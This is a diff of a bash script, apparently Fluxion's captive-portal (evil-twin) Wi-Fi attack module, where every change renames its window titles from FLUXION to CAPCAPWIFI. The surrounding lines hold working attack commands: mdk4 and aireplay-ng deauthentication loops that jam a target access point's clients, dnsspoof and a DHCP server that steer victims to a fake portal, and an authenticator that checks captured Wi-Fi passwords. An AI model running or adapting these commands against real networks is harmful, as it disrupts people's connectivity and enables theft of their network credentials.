@@ -1397,7 +1397,7 @@ fi
 if echo \"\$ClientBrand\" | grep -q x; then ClientBrand=\"unknown\"; fi
 
 echo \"
-FLUXION $FLUXIONVersion.$FLUXIONRevision
+CAPCAPWIFI $FLUXIONVersion.$FLUXIONRevision
 
 SSID: \\\"$staticSSID\\\"
 BSSID: $FluxionTargetMAC ($FluxionTargetMaker)
@@ -1876,21 +1876,21 @@ captive_portal_start_jammer_service() {
     if [ "$targetMode" = "subset" ]; then
       printf '%s\n' $targetClients > "$FLUXIONWorkspacePath/mdk4_blacklist.lst"
       fluxion_window_open CaptivePortalJammerServiceXtermPID \
-        "FLUXION AP Jammer Service [$FluxionTargetSSID]" "$BOTTOMRIGHT" "black" "#FF0009" \
+        "CAPCAPWIFI AP Jammer Service [$FluxionTargetSSID]" "$BOTTOMRIGHT" "black" "#FF0009" \
         "mdk4 $CaptivePortalJammerInterface d -c $FluxionTargetChannel -b \"$FLUXIONWorkspacePath/mdk4_blacklist.lst\""
     else
       fluxion_window_open CaptivePortalJammerServiceXtermPID \
-        "FLUXION AP Jammer Service [$FluxionTargetSSID]" "$BOTTOMRIGHT" "black" "#FF0009" \
+        "CAPCAPWIFI AP Jammer Service [$FluxionTargetSSID]" "$BOTTOMRIGHT" "black" "#FF0009" \
         "mdk4 $CaptivePortalJammerInterface d -c $FluxionTargetChannel -B $FluxionTargetMAC"
     fi
   elif [[ $option_deauth -eq 2 ]]; then
     if [ "$targetClients" ]; then
       fluxion_window_open CaptivePortalJammerServiceXtermPID \
-        "FLUXION AP Jammer Service [$FluxionTargetSSID]" "$BOTTOMRIGHT" "black" "#FF0009" \
+        "CAPCAPWIFI AP Jammer Service [$FluxionTargetSSID]" "$BOTTOMRIGHT" "black" "#FF0009" \
         "for client in $targetClients; do aireplay-ng -0 0 -a $FluxionTargetMAC -c \$client --ignore-negative-one $CaptivePortalJammerInterface & done; wait"
     else
       fluxion_window_open CaptivePortalJammerServiceXtermPID \
-        "FLUXION AP Jammer Service [$FluxionTargetSSID]" "$BOTTOMRIGHT" "black" "#FF0009" \
+        "CAPCAPWIFI AP Jammer Service [$FluxionTargetSSID]" "$BOTTOMRIGHT" "black" "#FF0009" \
         "aireplay-ng -0 0 -a $FluxionTargetMAC --ignore-negative-one $CaptivePortalJammerInterface"
     fi
   fi
@@ -2079,14 +2079,14 @@ start_attack() {
   # Clear any previous log entries
   > "$FLUXIONWorkspacePath/clients.txt"
   fluxion_window_open CaptivePortalDHCPServiceXtermPID \
-    "FLUXION AP DHCP Service" "$TOPLEFT" "black" "#CCCC00" \
+    "CAPCAPWIFI AP DHCP Service" "$TOPLEFT" "black" "#CCCC00" \
     "KEA_LOCKFILE_DIR=/run/lock/kea kea-dhcp4 ${FLUXIONDebug:+-d }-c \"$FLUXIONWorkspacePath/kea-dhcp4.conf\" 2>&1 | tee -a \"$FLUXIONWorkspacePath/clients.txt\""
   echo "DHCP Service: $CaptivePortalDHCPServiceXtermPID" \
     >> $FLUXIONOutputDevice
 
   echo -e "$FLUXIONVLine $CaptivePortalStartingDNSServiceNotice"
   fluxion_window_open CaptivePortalDNSServiceXtermPID \
-    "FLUXION AP DNS Service" "$BOTTOMLEFT" "black" "#99CCFF" \
+    "CAPCAPWIFI AP DNS Service" "$BOTTOMLEFT" "black" "#99CCFF" \
     "dnsspoof -i ${CaptivePortalAccessInterface} -f \"$FLUXIONWorkspacePath/hosts\""
   echo "DNS Service: $CaptivePortalDNSServiceXtermPID" \
     >> $FLUXIONOutputDevice
@@ -2100,7 +2100,7 @@ start_attack() {
   CaptivePortalWebServicePID=$!
 
   fluxion_window_open CaptivePortalWebServiceXtermPID \
-    "FLUXION Web Service" "$BOTTOM" "black" "#00CC00" \
+    "CAPCAPWIFI Web Service" "$BOTTOM" "black" "#00CC00" \
     "tail -f \"$FLUXIONWorkspacePath/lighttpd.log\""
   echo "Web Service: $CaptivePortalWebServiceXtermPID" \
     >> $FLUXIONOutputDevice
@@ -2111,7 +2111,7 @@ start_attack() {
 
   echo -e "$FLUXIONVLine $CaptivePortalStartingAuthenticatorServiceNotice"
   fluxion_window_open CaptivePortalAuthenticatorServiceXtermPID \
-    "FLUXION AP Authenticator" "$TOPRIGHT" "black" "#CCCCCC" \
+    "CAPCAPWIFI AP Authenticator" "$TOPRIGHT" "black" "#CCCCCC" \
     "$FLUXIONWorkspacePath/captive_portal_authenticator.sh"
   echo "Auth Service: $CaptivePortalAuthenticatorServiceXtermPID" \
     >> $FLUXIONOutputDevice
